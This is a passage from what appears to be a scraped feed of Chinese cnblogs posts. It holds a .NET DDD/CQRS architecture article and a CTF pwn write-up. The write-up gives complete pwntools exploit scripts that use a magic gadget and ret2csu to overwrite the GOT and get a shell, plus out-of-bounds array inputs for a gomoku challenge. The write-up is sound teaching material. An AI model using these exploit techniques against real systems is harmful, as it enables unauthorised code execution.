DomainEventHandlers（领域事件处理器）\n    └── Endpoints（API端点）\n</code></pre>\n<p>这种分层的好处是职责清晰，Domain层只关注业务逻辑，Infrastructure层负责技术实现，Web层处理HTTP请求和响应。</p>\n<h3 id=\"核心设计模式\">核心设计模式</h3>\n<h4 id=\"1-领域驱动设计ddd\">1. 领域驱动设计（DDD）</h4>\n<p>在这个项目中，DDD主要体现在聚合根的设计上。每个聚合根都有自己的业务边界，状态只能通过业务方法来修改。就拿部门这个聚合根来说吧：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门ID（强类型ID）\n/// &lt;/summary&gt;\npublic partial record DeptId : IInt64StronglyTypedId;\n\n/// &lt;summary&gt;\n/// 部门聚合根\n/// &lt;/summary&gt;\npublic class Dept : Entity&lt;DeptId&gt;, IAggregateRoot\n{\n    public string Name { get; private set; } = string.Empty;\n    public string Remark { get; private set; } = string.Empty;\n    public DeptId ParentId { get; private set; } = default!;\n    public int Status { get; private set; } = 1;\n    \n   \n    protected Dept() { }\n    \n    // 业务方法：更新部门信息\n    public void UpdateInfo(string name, string remark, DeptId parentId, int status)\n    {\n        Name = name;\n        Remark = remark;\n        ParentId = parentId;\n        Status = status;\n        UpdateTime = new UpdateTime(DateTimeOffset.UtcNow);\n        \n        // 发布领域事件\n        AddDomainEvent(new DeptInfoChangedDomainEvent(this));\n    }\n    \n    // 软删除\n    public void SoftDelete()\n    {\n        if (IsDeleted)\n        {\n            throw new KnownException(\"部门已经被删除\");\n        }\n        IsDeleted = true;\n        UpdateTime = new UpdateTime(DateTimeOffset.UtcNow);\n    }\n}\n</code></pre>\n<p>这里有几个设计点我觉得值得说一下。首先是强类型ID，比如<code>DeptId</code>，这样可以避免把部门ID和用户ID搞混，编译器就能帮你检查出来。其次是属性都用<code>private set</code>，外面不能直接修改，必须通过业务方法，这样就保证了业务规则的一致性。另外，当部门信息变更时会发布领域事件，这样可以通知其他需要同步更新的地方，比如用户表中的部门名称。</p>\n<h4 id=\"2-cqrs模式命令查询职责分离\">2. CQRS模式（命令查询职责分离）</h4>\n<p>CQRS在这个项目中主要体现在读写分离上。写操作通过命令（Command）来处理，读操作通过查询（Query）来处理。这样做的好处是职责清晰，而且可以针对不同的场景做优化。</p>\n<p>写操作这边，命令的定义很简单，就是一个record。每个命令都有对应的验证器和处理器。看一个创建部门的例子：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 创建部门命令\n/// &lt;/summary&gt;\npublic record CreateDeptCommand(string Name, string Remark, DeptId? ParentId, int Status) \n    : ICommand&lt;DeptId&gt;;\n\n/// &lt;summary&gt;\n/// 命令验证器\n/// &lt;/summary&gt;\npublic class CreateDeptCommandValidator : AbstractValidator&lt;CreateDeptCommand&gt;\n{\n    public CreateDeptCommandValidator(DeptQuery deptQuery)\n    {\n        RuleFor(d =&gt; d.Name).NotEmpty().WithMessage(\"部门名称不能为空\");\n        RuleFor(d =&gt; d.Name)\n            .MustAsync(async (n, ct) =&gt; !await deptQuery.DoesDeptExist(n, ct))\n            .WithMessage(d =&gt; $\"该部门已存在，Name={d.Name}\");\n        RuleFor(d =&gt; d.Status).InclusiveBetween(0, 1).WithMessage(\"状态值必须为0或1\");\n    }\n}\n\n/// &lt;summary&gt;\n/// 命令处理器\n/// &lt;/summary&gt;\npublic class CreateDeptCommandHandler(IDeptRepository deptRepository) \n    : ICommandHandler&lt;CreateDeptCommand, DeptId&gt;\n{\n    public async Task&lt;DeptId&gt; Handle(CreateDeptCommand request, CancellationToken cancellationToken)\n    {\n        var parentId = request.ParentId ?? new DeptId(0);\n        var dept = new Dept(request.Name, request.Remark, parentId, request.Status);\n        \n        await deptRepository.AddAsync(dept, cancellationToken);\n        \n        // 注意：不需要手动调用SaveChanges，框架会自动处理\n        return dept.Id;\n    }\n}\n</code></pre>\n<p>验证器这里用了FluentValidation，支持同步和异步验证。比如检查部门名称是否已存在这种需要查数据库的验证，就可以用异步的<code>MustAsync</code>。</p>\n<p>读操作这边，直接使用DbContext，而且可以用投影来优化性能。比如获取部门树的时候，只选择需要的字段：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门查询服务\n/// &lt;/summary&gt;\npublic class DeptQuery(ApplicationDbContext applicationDbContext) : IQuery\n{\n    private DbSet&lt;Dept&gt; DeptSet { get; } = applicationDbContext.Depts;\n    \n    /// &lt;summary&gt;\n    /// 获取部门树（使用投影优化性能）\n    /// &lt;/summary&gt;\n    public async Task&lt;IEnumerable&lt;DeptTreeDto&gt;&gt; GetDeptTreeAsync(\n        bool includeInactive = false, \n        CancellationToken cancellationToken = default)\n    {\n        // 使用投影只选择需要的字段，减少内存占用\n        var allDepts = await DeptSet.AsNoTracking()\n            .WhereIf(!includeInactive, d =&gt; d.Status != 0)\n            .Select(d =&gt; new DeptTreeNode\n            {\n                Id = d.Id,\n                Name = d.Name,\n                Remark = d.Remark,\n                ParentId = d.ParentId,\n                Status = d.Status,\n                CreatedAt = d.CreatedAt\n            })\n            .ToListAsync(cancellationToken);\n        \n        // 在内存中构建树形结构\n        return BuildTreeStructure(allDepts);\n    }\n}\n</code></pre>\n<p>这样读写分离的好处是，查询这边可以针对不同的查询场景做优化，比如用投影减少内存占用，或者将来可以加缓存、用读库等，而不会影响写操作的逻辑。</p>\n<h4 id=\"3-事件驱动架构\">3. 事件驱动架构</h4>\n<p>事件驱动这块，项目实现了领域事件和集成事件两种机制。领域事件主要用于聚合内部的同步操作，集成事件用于跨服务通信。</p>\n<p>比如说，当部门信息变更的时候，需要同步更新用户表中的部门名称。这个过程就可以通过领域事件来实现：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门信息变更领域事件\n/// &lt;/summary&gt;\npublic record DeptInfoChangedDomainEvent(Dept Dept) : IDomainEvent;\n</code></pre>\n<p>然后在事件处理器中处理这个逻辑：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门信息变更领域事件处理器 - 用于更新用户部门名称\n/// &lt;/summary&gt;\npublic class DeptInfoChangedDomainEventHandlerForUpdateUserDeptName(\n    IMediator mediator, \n    UserQuery userQuery) \n    : IDomainEventHandler&lt;DeptInfoChangedDomainEvent&gt;\n{\n    public async Task Handle(DeptInfoChangedDomainEvent domainEvent, CancellationToken cancellationToken)\n    {\n        var dept = domainEvent.Dept;\n        var deptId = dept.Id;\n        var newDeptName = dept.Name;\n        \n        // 查询所有属于该部门的用户ID\n        var userIds = await userQuery.GetUserIdsByDeptIdAsync(deptId, cancellationToken);\n        \n        // 通过Command更新每个用户的部门名称（而不是直接操作数据库）\n        foreach (var userId in userIds)\n        {\n            var command = new UpdateUserDeptNameCommand(userId, newDeptName);\n            await mediator.Send(command, cancellationToken);\n        }\n    }\n}\n</code></pre>\n<p>这样设计的好处是，部门聚合和用户聚合之间没有直接依赖，通过事件来通信。如果将来需要增加新的业务逻辑，比如部门变更时要发送通知，只需要再加一个事件处理器就行了，不需要改现有的代码。</p>\n<h4 id=\"4-fastendpoints轻量级api框架\">4. FastEndpoints轻量级API框架</h4>\n<p>在API设计这块，项目选择了FastEndpoints而不是传统的Controller。主要是觉得FastEndpoints的代码更简洁，性能也更好。一个端点就是一个类，职责清晰。</p>\n<p>看一个创建部门的例子：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 创建部门的API端点\n/// &lt;/summary&gt;\n[Tags(\"Depts\")]\npublic class CreateDeptEndpoint(IMediator mediator) \n    : Endpoint&lt;CreateDeptRequest, ResponseData&lt;CreateDeptResponse&gt;&gt;\n{\n    public override void Configure()\n    {\n        Post(\"/api/admin/dept\");\n        AuthSchemes(JwtBearerDefaults.AuthenticationScheme);\n        Permissions(PermissionCodes.AllApiAccess, PermissionCodes.DeptCreate);\n    }\n    \n    public override async Task HandleAsync(CreateDeptRequest req, CancellationToken ct)\n    {\n        var cmd = new CreateDeptCommand(req.Name, req.Remark, req.ParentId, req.Status);\n        var deptId = await mediator.Send(cmd, ct);\n        var response = new CreateDeptResponse(deptId, req.Name, req.Remark);\n        await Send.OkAsync(response.AsResponseData(), cancellation: ct);\n    }\n}\n</code></pre>\n<p>代码很简洁，一个类就把路由、认证、权限都配置好了。请求和响应都是强类型的，类型安全有保障。而且测试起来也很方便，不需要启动HTTP服务器，直接测端点就行了。</p>\n<h2 id=\"几个核心特性\">几个核心特性</h2>\n<h3 id=\"1-强类型id\">1. 强类型ID</h3>\n<p>这个项目里所有聚合根都用强类型ID，而不是直接用<code>long</code>或<code>int</code>。比如部门ID是<code>DeptId</code>，用户ID是<code>UserId</code>。这样做的好处是编译器能帮你检查类型错误，不会把部门ID和用户ID搞混。</p>\n<p>使用起来也很简单：</p>\n<pre><code class=\"language-csharp\">// 定义强类型ID\npublic partial record DeptId : IInt64StronglyTypedId;\n\n// 使用强类型ID\nvar deptId = new DeptId(123);\nvar parentId = request.ParentId ?? new DeptId(0);\n</code></pre>\n<p>框架会自动处理序列化和类型转换，用起来很顺手。</p>\n<h3 id=\"2-仓储模式\">2. 仓储模式</h3>\n<p>仓储这块，写操作通过仓储来处理，查询操作直接使用DbContext。仓储的实现很简单：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门仓储接口\n/// &lt;/summary&gt;\npublic interface IDeptRepository : IRepository&lt;Dept, DeptId&gt; { }\n\n/// &lt;summary&gt;\n/// 部门仓储实现\n/// &lt;/summary&gt;\npublic class DeptRepository(ApplicationDbContext context) \n    : RepositoryBase&lt;Dept, DeptId, ApplicationDbContext&gt;(context), \n      IDeptRepository { }\n</code></pre>\n<p>框架会自动管理事务和SaveChanges，命令处理器里不需要手动调用，这样代码更简洁，也不容易出错。</p>\n<h3 id=\"3-验证机制\">3. 验证机制</h3>\n<p>验证用的是FluentValidation，支持同步和异步验证。比如创建部门的时候，需要检查部门名称是否已存在，就可以用异步验证：</p>\n<pre><code class=\"language-csharp\">public class CreateDeptCommandValidator : AbstractValidator&lt;CreateDeptCommand&gt;\n{\n    public CreateDeptCommandValidator(DeptQuery deptQuery)\n    {\n        RuleFor(d =&gt; d.Name).NotEmpty().WithMessage(\"部门名称不能为空\");\n        // 异步验证：检查部门名称是否已存在\n        RuleFor(d =&gt; d.Name)\n            .MustAsync(async (n, ct) =&gt; !await deptQuery.DoesDeptExist(n, ct))\n            .WithMessage(d =&gt; $\"该部门已存在，Name={d.Name}\");\n    }\n}\n</code></pre>\n<h3 id=\"4-异常处理\">4. 异常处理</h3>\n<p>业务异常用<code>KnownException</code>来处理，框架会自动转换成合适的HTTP状态码。比如在聚合根里：</p>\n<pre><code class=\"language-csharp\">// 在聚合根中\npublic void SoftDelete()\n{\n    if (IsDeleted)\n    {\n        throw new KnownException(\"部门已经被删除\");\n    }\n    // ...\n}\n\n// 在命令处理器中\nvar dept = await deptRepository.GetAsync(request.DeptId, cancellationToken) \n    ?? throw new KnownException($\"未找到部门，DeptId = {request.DeptId}\");\n</code></pre>\n<p>这样前端收到的错误信息就很清晰，不需要再做额外的转换。</p>\n<h2 id=\"测试策略\">测试策略</h2>\n<p>测试这块，项目用的是xUnit，集成测试用了Aspire来自动管理测试环境。这样做的好处是不用手动搭建测试数据库、Redis这些基础设施，Aspire会自动启动和管理。</p>\n<p>看一个部门创建接口的测试例子：</p>\n<pre><code class=\"language-csharp\">[Collection(WebAppTestCollection.Name)]\npublic class DeptTests(WebAppFixture app) : AuthenticatedTestBase&lt;WebAppFixture&gt;(app)\n{\n    [Fact]\n    public async Task CreateDept_WithValidData_ShouldSucceed()\n    {\n        // Arrange\n        var client = await GetAuthenticatedClientAsync();\n        var deptName = $\"测试部门_{Guid.NewGuid():N}\";\n        \n        try\n        {\n            // Act\n            var request = new CreateDeptRequest(deptName, \"测试备注\", null, 1);\n            var (response, result) = await client.POSTAsync&lt;\n                CreateDeptEndpoint, \n                CreateDeptRequest, \n                ResponseData&lt;CreateDeptResponse&gt;&gt;(request);\n            \n            // Assert\n            Assert.True(response.IsSuccessStatusCode);\n            Assert.NotNull(result?.Data);\n            Assert.Equal(deptName, result.Data.Name);\n        }\n        finally\n        {\n            await CleanupTestDataAsync();\n        }\n    }\n}\n</code></pre>\n<p>这种测试方式很接近真实的场景，测试的是完整的HTTP请求流程，而且会自动清理测试数据，保证测试之间的独立性。另外还支持身份认证测试，可以模拟登录用户的各种操作。</p>\n<h2 id=\"前端架构\">前端架构</h2>\n<p>前端用的是Vben Admin这个模板，这是一个基于Vue 3的管理后台框架。技术栈也比较主流：Vue 3 Composition API、TypeScript、Vite、Ant Design Vue，状态管理用Pinia，路由用Vue Router。</p>\n<p>Vben Admin这个框架做得很完善，开箱即用的功能很多。比如权限控制，支持路由权限和按钮权限，用起来很方便。还有国际化支持，可以多语言切换。主题和布局也可以定制，基本的管理后台需求都能满足。</p>\n<p>最重要的是类型安全，前后端都用了TypeScript，接口定义好之后，类型检查能帮你发现很多问题。</p>\n<h2 id=\"开发规范\">开发规范</h2>\n<p>为了让代码质量更统一，项目里制定了一些开发规范。比如文件的组织方式：</p>\n<ul>\n<li>聚合根放在 <code>Domain/AggregatesModel/{AggregateName}Aggregate/</code></li>\n<li>领域事件放在 <code>Domain/DomainEvents/</code></li>\n<li>仓储放在 <code>Infrastructure/Repositories/</code></li>\n<li>命令放在 <code>Web/Application/Commands/{Module}Commands/</code></li>\n<li>查询放在 <code>Web/Application/Queries/</code></li>\n<li>端点放在 <code>Web/Endpoints/{Module}Endpoints/</code></li>\n</ul>\n<p>还有一些强制性的要求，比如所有聚合根都用强类型ID，而且不手动赋值ID，依赖EF的值生成器。所有命令都要有对应的验证器。领域事件要在聚合发生改变时发布。命令处理器不能调用SaveChanges，框架会自动处理。仓储必须用异步方法。业务异常用KnownException处理。</p>\n<p>另外，项目还提供了很多代码片段，可以快速生成常用代码。比如<code>ncpcmd</code>可以生成命令及其验证器和处理器，<code>ncpar</code>可以生成聚合根，<code>ncprepo</code>可以生成仓储接口和实现，<code>epp</code>可以生成FastEndpoint的完整实现。这样开发效率会高不少。</p>\n<h2 id=\"云原生支持\">云原生支持</h2>\n<p>项目集成了.NET Aspire，这个功能真的很方便。启动开发环境只需要运行AppHost项目，Aspire会自动管理所有依赖服务，不需要手动启动数据库、Redis、RabbitMQ这些。</p>\n<pre><code class=\"language-bash\"># 仅需确保Docker环境运行\ndocker version\n\n# 直接运行AppHost项目，Aspire会自动管理所有依赖服务\ncd src/Ncp.Admin.AppHost\ndotnet run\n</code></pre>\n<p>Aspire会自动启动和管理数据库容器（MySQL、PostgreSQL等）、消息队列容器（RabbitMQ等）、Redis容器，还会提供统一的Aspire Dashboard界面，可以查看所有服务的状态。服务之间的连接字符串也会自动配置，省了很多麻烦。</p>\n<h2 id=\"代码分析可视化\">代码分析可视化</h2>\n<p>框架还提供了代码流分析和可视化功能，这个对理解架构很有帮助。可以通过命令行工具生成HTML文件：</p>\n<pre><code class=\"language-bash\"># 安装全局工具\ndotnet tool install -g NetCorePal.Extensions.CodeAnalysis.Tools\n\n# 生成可视化文件\ncd src/Ncp.Admin.Web\nnetcorepal-codeanalysis generate --output architecture.html\n</code></pre>\n<p>支持生成架构流程图、命令链路图、事件流程图、类图等，可以直观地看到代码之间的关系和数据流向。</p>\n<h2 id=\"总结\">总结</h2>\n<p>这个项目算是一个DDD架构的实践案例，展示了如何在.NET 10生态中应用DDD、CQRS、事件驱动这些架构思想。整体架构清晰，职责分明，代码组织得也比较规范。</p>\n<p>技术栈上，后端用.NET 10 + EF Core + FastEndpoints + MediatR，前端用Vue 3 + TypeScript + Vite，都是目前比较主流的技术。开发体验上，有代码片段、自动化工具，还有完善的开发规范，开发效率还可以。</p>\n<p>可维护性这块，代码分层清晰，测试支持也比较完善，还有代码可视化工具，方便新人理解架构。云原生支持也很到位，Aspire让基础设施管理变得简单。</p>\n<p>如果你也在做类似的管理系统，或者想了解DDD在实际项目中的应用，可以看看这个项目的代码，应该能有一些参考价值。项目地址在<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a>，欢迎交流讨论。</p>\n<h2 id=\"参考资料\">参考资料</h2>\n<p>最后附上一些相关的参考资料，有兴趣的朋友可以深入了解一下：</p>\n<ul>\n<li><a href=\"https://github.com/netcorepal/netcorepal-cloud-framework\" rel=\"noopener nofollow\" target=\"_blank\">NetCorePal Cloud Framework</a> - 项目使用的基础框架</li>\n<li><a href=\"https://fastendpoints.com/\" rel=\"noopener nofollow\" target=\"_blank\">FastEndpoints</a> - 轻量级API框架</li>\n<li><a href=\"https://github.com/vbenjs/vue-vben-admin\" rel=\"noopener nofollow\" target=\"_blank\">Vben Admin</a> - 前端管理后台模板</li>\n<li><a href=\"https://learn.microsoft.com/dotnet/aspire/\" rel=\"noopener nofollow\" target=\"_blank\">.NET Aspire</a> - 云原生应用开发平台</li>\n</ul>\n<p>项目源码地址：<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a></p>\n<hr />\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 22:57</span>&nbsp;\n<a href=\"https://www.cnblogs.com/aishangyipiyema\">红泥巴煮雪</a>&nbsp;\n阅读(<span id=\"post_view_count\">186</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "栈的一个magic gadget的运用以及数组越界",
      "link": "https://www.cnblogs.com/firefly-star/p/19499036",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/firefly-star/p/19499036\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 20:04\">\n    <span>栈的一个magic gadget的运用以及数组越界</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        the end？？？\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<pre><code class=\"language-asm\">.text:0000000000400658                 add     [rbp-3Dh], ebx\n.text:000000000040065B                 nop\n.text:000000000040065C                 retn\n</code></pre>\n<p>这个gadget就比较常见了，就是把ebx的值加给rbp-0x3d内的一个指针解引用后的内容，后面是进行了一个nop不作操作，再后面ret就是继续执行我们栈上的内容，这个主要是要控制rbp与rbx才能实现任意地址写，主要还是利用之前讲过的csu函数去控制这两个寄存器。下面看例题</p>\n<h4 id=\"basectf2024新生赛ezstack\">BaseCTF2024新生赛ezstack</h4>\n<p>先checksec<br />\n<img alt=\"Q3`IZ7H~STBYZ7()8IEVW0J\" class=\"lazyload\" /></p>\n<p>这里只开了nx保护，我们去ida看看<br />\n<img alt=\"Y8`A78$U0FF1LZCL(DAXO4N\" class=\"lazyload\" /></p>\n<p>这里就一个光秃秃的gets栈溢出，什么输出函数都没有。那怎么办呢？这里因为没有全开relro可以打ret2dlresolve，不过这里也有magic gadget<br />\n<img alt=\"@VCEQG%I4)ZKHTJH\" class=\"lazyload\" /></p>\n<p>那这里其实有很多解法了，第一种就是ret2dlresolve（后面我会单独写个文章和延迟绑定机制一起讲），第二种是用magic gadget写got表，写出来一个system函数，直接rop链打完，第三种是因为标准输出也是一个libc库的指针，所以我们也可以写这个，只要我们把他写成一个输出函数，就可以实现泄露libc基址<br />\n<img alt=\"}~Z${Z`MRYU)UE()AU963KW\" class=\"lazyload\" /></p>\n<p>这里其实第一种和第二种都比较看题，如果开了full relro那就不能用了，第三种就比较全一点，没有这个限制。</p>\n<h5 id=\"用magic-gadget改got表解法\">用magic gadget改got表解法</h5>\n<p>这里我们先看第二种，我们先找got表有哪些函数<br />\n<img alt=\"JN17UWAK26TT_0B\" class=\"lazyload\" /></p>\n<p>这里有两个函数，随便写哪个都一样，我们写gets看看，先找出gets和system在libc的偏移<br />\n<img alt=\"DI6441H9(178_7((DD2I4R\" class=\"lazyload\" /></p>\n<p>我们只需要把0x80520+某个数让它=0x50d70，我们这里很显然注意到这里要用补码，我们直接算一下就知道答案是0xFFFFFFFFFFFD0850所以这里就很简单了，我们只需要控制rbx是0xFFFFFFFFFFFD0850，rbp是gets的got表的地址+0x3d就写完了，完整exp如下</p>\n<pre><code>from pwn import *\nimport sys\n#context.log_level='debug'\ncontext.arch='amd64'\nflag = 1\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',32689)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu(rbx,rbp,got,rdi,rsi,rdx):\n\tpay=p64(0)+p64(rbx)+p64(rbp)+p64(got)+p64(rdi)+p64(rsi)+p64(rdx)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nmagic=0x400658\ncsugo=0x4006D0\ncsuin=0x4006E6\nrdi=0x4006f3\ngets=elf.got['gets']\ntarget=0x601018\nret=0x4006F4\nsystem=elf.plt['gets']\nget=elf.sym['gets']\npay=0x10*b'b'+flat(rdi,elf.bss()+0x50,get)+p64(csuin)+csu(0xFFFFFFFFFFFD0850,target+0x3d,0,0,0,0)+p64(magic)+flat(ret,rdi,elf.bss()+0x50,system)\nsl(pay)\nsl(b'/bin/sh\\x00')\nti()\n</code></pre>\n<p>效果如下<br />\n<img alt=\")QTV6KVN}9H0SDY_AM9I\" class=\"lazyload\" /></p>\n<h5 id=\"用magic-gadget改bss解法\">用magic gadget改bss解法</h5>\n<p>去改bss也可以，不过有点奇怪，我远程没打通。具体流程是一样的，先从stdin，stdout，stderr里挑一个找他们在libc里的偏移，再找一个输出函数在libc里的偏移。不过因为要泄露libc所以需要两次输入，直接返回main是会报错的，好像是因为io结构体被我们改掉了所以不能直接用gets了，这里选择就是再用一次magic gadget把我们改的io结构再改回去就可以再用gets了往bss写了，写完我们再用两次leave栈迁移过去执行即可（也可以不迁移用ret2csu），然后因为system函数会抬栈，要把gets写入bss的地址写高一点，我打本地的脚本如下</p>\n<pre><code>from pwn import *\nimport sys\n#context.log_level='debug'\ncontext.arch='amd64'\nflag = 1\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',30415)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu(rbx,rbp,got,rdi,rsi,rdx):\n\tpay=p64(0)+p64(rbx)+p64(rbp)+p64(got)+p64(rdi)+p64(rsi)+p64(rdx)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nmagic=0x400658\ncsugo=0x4006D0\ncsuin=0x4006E6\nrdi=0x4006f3\ngets=elf.got['gets']\nget=elf.sym['gets']\ntarget=0x601040\nret=0x4006F4\nleave=0x40068C\nbss=0x6011D0+0x800\nrbp=0x400656\npay=0x10*b'b'+p64(csuin)+csu(0xFFFFFFFFFFEF9160,target+0x3d,0,0,0,0)+p64(magic)+p64(csuin)+csu(0,1,target,2,gets,0x20)+p64(csugo)+csu(0x106EA0,target+0x3d,0,0,0,0)+p64(magic)+flat(rdi,bss,get,rbp,bss,leave)+p64(leave)\nsl(pay)\nlibcbase=u64(rc(6).ljust(8,b'\\x00'))-libc.sym['gets']\nprint(hex(libcbase))\nsystem=libcbase+libc.sym['system']\nbinsh=libcbase+next(libc.search(b'/bin/sh'))\npay=flat(0,ret,rdi,binsh,system)\nsl(pay)\nti()\n</code></pre>\n<p>我的版本是glibc2.35，小版本是3.11，远程是glibc2.35小版本是3.8。理论上远程的偏移应该是0xFFFFFFFFFFEF9008，不过我输这个不知道为啥不行，好像是没改成write函数，没有泄露出来。挺奇怪的。不过思路大概就是这样，效果如下<br />\n<img alt=\"5IQ7YA{1KO8@%}O53GIFQXL\" class=\"lazyload\" /></p>\n<h2 id=\"数组越界\">数组越界</h2>\n<p>数组越界顾名思义，也就是访问数组时索引超出定义范围，可能导致程序访问非法内存。比如我定义一个数组a[10]，然后后面有a[i]但i却能等于10，这就越界了。如果他检查i范围检查的不细致（没检查上界或下界）就可以实现几乎任意地址访问，那具体访问的地址是什么地址的呢？这就得有一些c语言基础了，在c语言中我们知道a[1]=*(a+1)这样我们的a[i]其实就是 *(a+i)假如i可以控制，或者a+i这个地址就是我们想改的地址，那么我们就可以访问到这个地址的内存，就很有可能可以进行修改。具体的地址运算就要看该数组的定义，int就是4字节定义，假如int a[10]那a地址与a+1地址就差4，char就差1，double就差8，二维数组也一样，二维数组可以看成一维数组的数组，比如int a[10] [10]，相当于把a[10]又看成一个数组的元素，那a[1]距离a就差10个int，也就是40。还不懂的话可以去看看c语言，下面我们看题。</p>\n<h4 id=\"basectf2024新生赛五子棋\">BaseCTF2024新生赛五子棋</h4>\n<p>这题其实9分逆向1分pwn，逆向出来了基本就写完了，不过我们还是老规矩先checksec<br />\n<img alt=\"AHGT0C`N8%FTZZHROPA}GA\" class=\"lazyload\" /></p>\n<p>然后去ida看看<br />\n<img alt=\"1BR8%BU`Y3$LHVL45_LDO\" class=\"lazyload\" /></p>\n<p>这里既然是五子棋，那肯定要有这几个模块，打印地图，玩家下棋，另一方下棋，检查，获胜。简单逆向一下，这里逻辑就是首先展示地图，然后用户先下，判断用户是否赢，没赢就递归调用game函数把a1改成1让if为真，进而让电脑下棋，然后判断电脑有没有赢，然后把a1改成0让用户再下，只要我们的下两颗棋就获胜就给我们shell，显然这样直接下不可能获得shell，所以一定有某个漏洞。</p>\n<p><img alt=\"13OB90LPMQE$QMFA58{{B$1\" class=\"lazyload\" /></p>\n<p>这里漏洞在用户下棋那里<br />\n<img alt=\"QFWDFOKY%HT2OQ06@8CKD\" class=\"lazyload\" /></p>\n<p>这里有数组越界，不过运用的时候要注意因为地图其实里面一开始都是数字-1，所以我们只能在数字为-1的地方改数值，改成这个0，接下来我们看判断输赢的函数。</p>\n<p>这里我们可以看见，这里四个循环，而这个x数组和y数组配合起来应该就是一个方向数组，通过n7的循环让这两个数组组合实现标定方向，n5的循环在遍历8个方向的棋子，n19_3与n19_2的组合就是遍历整个地图找标点，后面n7与n5就是在这个标点上延伸8个方向，如果有一次没找到对应棋子就断开这一次n5的循环换一个方向再找（也就是五子棋没连起来五个子），如果能找到五个（遍历五次）就判断获胜。我们可以看看这个方向向量的数组<br />\n<img alt=\"OMY$C@ROM(2T1I2HJN~SDS\" class=\"lazyload\" /></p>\n<p>这个dd就是定义双字的意思define doubleword，双字就是4个字节，也就是int的意思。其中2  dup(0)就是0重复两次，0FFFFFFFFh这里h就是16进制的意思，其实就是0xFFFFFFFF，这个就是-1的补码形式，数组内容如下</p>\n<pre><code>y ：0 0 1 -1 1 -1 1 -1\nx : 1 -1 0 0 1 -1 -1 1\n</code></pre>\n<p>因为小端序所以他们的地址就是从左到右就是依次由0x4020去+4。到这里这个题就差不多结束了，因为我们用户输入能把-1变成0，这里我们要么选0x402c这个地址把这个-1变成0，这样xy组合的方向向量就变成(0,0)了，相当于这个地方延伸的五个方向都是他自己，实现检查自己五次，那就可以实现两颗棋子获胜了（也就是第二颗棋子下在方向数组里了哈哈），要么我们选把0x4044这个地址的-1变成0，这些都可以。接下来我们算我们地图数组到方向数组的偏移<br />\n<img alt=\"KF%FKN`58RO2DF_UMIL5JO1\" class=\"lazyload\" /></p>\n<p>地图数组的起始位置是0x9D60而且他也是int，以0x4044为例，到这的偏移就是0x9D60-0x4044也就是0x5D1C也就是十进制的23836我们知道int代表4字节，23836也就是5,959个偏移，也就是我们需要map[-5959]就能改到这个位置实现把方向向量改成(0,0)，我们下棋是这样下的<br />\nmap[20 * n19 + n19_1]=0，所以就随便搭配一下n19和n19_1凑出来-5959就可以了，这里注意n19，n19_1不能大于19就可以了，比如-298*20  1<br />\n或者-297 *20  -19都可以。这样我们只需要nc上去，先随便下一个地方，再输入-298 1或者-297 -19就getshell了。效果如下。<br />\n<img alt=\"IX4X{`$K@{BILRR~N4HWRU\" class=\"lazyload\" /></p>\n<p><img alt=\"09NCIA80SBA}{@1)(R7IAU\" class=\"lazyload\" /></p>\n<p><img alt=\"R6ISE2(U50D_B%M2_XEW0\" class=\"lazyload\" /></p>\n<p>这题感觉设计的挺好的，有点意思，虽然逆向了我好久...</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 20:04</span>&nbsp;\n<a href=\"https://www.cnblogs.com/firefly-star\">firefly_star</a>&nbsp;\n阅读(<span id=\"post_view_count\">38</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "告别代码！我用Trae氛围编程的方式，开发了一款公众号文章同步插件！",
      "link": "https://www.cnblogs.com/chingho/p/19498962",
      "published": "",
